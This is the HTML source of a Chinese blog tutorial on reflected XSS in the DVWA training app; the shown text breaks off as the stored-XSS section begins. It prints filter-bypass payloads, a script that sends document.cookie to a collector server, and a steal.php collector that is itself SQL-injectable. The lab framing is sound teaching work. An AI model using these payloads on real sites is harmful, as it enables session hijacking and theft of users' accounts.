@@ -1,0 +1,1431 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="jax">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="jax">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>通过DVWA学习XSS · jax&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >jax&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">通过DVWA学习XSS</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>jax's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            通过DVWA学习XSS
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "XSS学习">XSS学习</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">6.4k</span>阅读时长: <span class="post-count reading-time">31 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/18</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="通过DVWA学习XSS"><a href="#通过DVWA学习XSS" class="headerlink" title="通过DVWA学习XSS"></a>通过DVWA学习XSS</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>这篇文章通过 dvwa 简单研究了三种类型的 xss，并且讲述了如何利用 xss 获取目标网站用户的 cookie。</strong></p>
+<h2 id="dvwa反射型xss"><a href="#dvwa反射型xss" class="headerlink" title="dvwa反射型xss"></a>dvwa反射型xss</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<p>一台 win2003 虚拟机，ip 为 192.168.50.128，用wamp集成环境将dvwa搭在8080端口。</p>
+<p>一台 win7 虚拟机，ip 为 192.168.50.150，用来接受漏洞网站的cookie，web由phpstudy搭建。</p>
+</blockquote>
+<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p>为了便于理解，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出没有任何过滤，直接将用户提交的GET参数name输出到页面，我们可以输入payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>来验证xss的存在。</p>
+<p><img src="/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/1514183818823.png!small" alt="1.PNG"></p>
+<p>接下来是利用xss获取用户cookie,由于script标签可以加载远程服务器的javascript代码并且执行，所以我们在win7的服务器下编写cookie.js。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;form action=&apos;http://192.168.50.150/dvwaxss/steal.php&apos; name=&apos;exploit&apos; method=&apos;post&apos; style=&apos;display:none&apos;&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;input type=&apos;hidden&apos; name=&apos;data&apos; value=&apos;&quot;+document.cookie+&quot;&apos;&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;/form&gt;&quot;);</span><br><span class="line">document.exploit.submit();</span><br></pre></td></tr></table></figure>
+
+<p>这段js代码的作用是在页面中构造一个隐藏表单和一个隐藏域，内容为当前的cookie，并且以post方式发送到同目录下的steal.php。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">$conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">mysql_select_db(&quot;dvwacookie&quot;,$conn);</span><br><span class="line">if(isset($_GET[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_POST[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;select * from low&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    while($row=mysql_fetch_array($result))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>steal.php将我们获取到的cookie存到数据库中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create database dvwacookie;</span><br><span class="line">use dvwacookie;</span><br><span class="line">create table low(id int not null auto_increment primary key,cookie varchar(100) not null);</span><br><span class="line">create table medium(id int not null auto_increment primary key,cookie varchar(100) not null);</span><br><span class="line">create table high(id int not null auto_increment primary key,cookie varchar(100) not null);</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们在有xss漏洞的位置插入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://192.168.50.150/dvwaxss/cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>相当于构造链接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_r/?name=&lt;script src=http://192.168.50.150/dvwaxss/cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将链接发给该网站下的受害者，受害者点击时就会加载远程服务器（这里是win7）的cookie.js脚本，这里要提一点，用src加载远程服务器的js脚本，那么js的源就会变成加载它的域，从而可以读取该域的数据。</p>
+<p>这时，win7的数据库就接收到了cookie。</p>
+<p><img src="/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/15141842926340.png!small" alt="éè¿DVWAå­¦ä¹ XSS"></p>
+<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可看出代码将我们输入内容中的<code>&lt;script&gt;</code>标签替换为了空，但是str_replace这个函数是不区分大小写的，而且只替换一次，所以我们构造payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;SCRIPT&gt;alert(&quot;xss&quot;)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>均可以弹框，同样的，插入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt src=http://192.168.50.150/dvwaxss/cookie.js&gt;&lt;/script&gt;</span><br><span class="line">&lt;SCRIPT src=http://192.168.50.150/dvwaxss/cookie.js&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>加载远程脚本steal.php。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">$conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">mysql_select_db(&quot;dvwacookie&quot;,$conn);</span><br><span class="line">if(isset($_GET[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into medium(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_POST[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into medium(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;select * from medium&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    while($row=mysql_fetch_array($result))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将获取的cookie加入medium表，结果如下：</p>
+<p><img src="/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/15141843516335.png!small" alt="éè¿DVWAå­¦ä¹ XSS"></p>
+<h3 id="high-级别"><a href="#high-级别" class="headerlink" title="high 级别"></a>high 级别</h3><p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现添加了对大小写绕过的判断，而且根据正则表达式过滤，提交内容只要有script顺序出现的字母都一律过滤掉，只是过滤了script标签，但是有一些javascript事件后仍然能执行javascript代码，构造payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过加载一个不存在的图片出错出发javascript onerror事件,继续弹框，证明出来有xss，这样的payload还有很多。</p>
+<p><img src="/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/15141844011648.png!small" alt="通过DVWA学习XSS"></p>
+<p>在xss的位置插入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=(location.href=&quot;http://192.168.50.150/dvwaxss/steal.php?data=&quot;+document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过触发onerror事件跳转链接到远程服务器的steal.php，同时以GET带上当前的cookie，但是输入被过滤了。</p>
+<p><img src="/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/15141844412084.png!small" alt="通过DVWA学习XSS"></p>
+<p>只剩下<code>Hello .cookie)&gt;</code>，what！？不应该啊,在这被坑了好久，终于发现问题所在。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img SrC=# oneRror=(locatIon.href=&quot;httP://192.168.50.150/dvwaxss/steal.php?data=&quot;+documenT.cookie)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意观察我们所插入的代码，我表明的大写部分，竟然构成了一个script，所以符合代码的正则，从而过滤掉了，这实在是坑啊……那我们将插入代码中的i进行html编码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=(locat&amp;#x69;on.href=&quot;http://192.168.50.150/dvwaxss/steal.php?data=&quot;+document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们提交这段代码后绕过了过滤，然后浏览器进行了html解码，然后就是之前一样的过程，触发onerror事件，对远程服务器的steal.php发送我们的cookie steal.php。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">$conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">mysql_select_db(&quot;dvwacookie&quot;,$conn);</span><br><span class="line">if(isset($_GET[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into high(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_POST[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into high(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;select * from high&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    while($row=mysql_fetch_array($result))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>远程服务器接收到了cookie的信息。<img src="/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/15141845159621.png!small" alt="通过DVWA学习XSS"></p>
+<h2 id="dvwa存储型xss"><a href="#dvwa存储型xss" class="headerlink" title="dvwa存储型xss"></a>dvwa存储型xss</h2><p>存储型xss的不同之处在于它可以将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发，相比较反射型xss更为隐蔽，危害更大，受害者也会更多，在这我将介绍几种更为隐蔽的方式获取用户cookie。</p>
+<h3 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<p>同上次的一样，一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口。</p>
+<p>一台win7虚拟机，ip为192.168.50.150,用来接受漏洞网站的cookie，web由phpstudy搭建。</p>
+</blockquote>
+<h3 id="low级别-1"><a href="#low级别-1" class="headerlink" title="low级别"></a>low级别</h3><p><strong>为了便于理解，代码如下</strong></p>
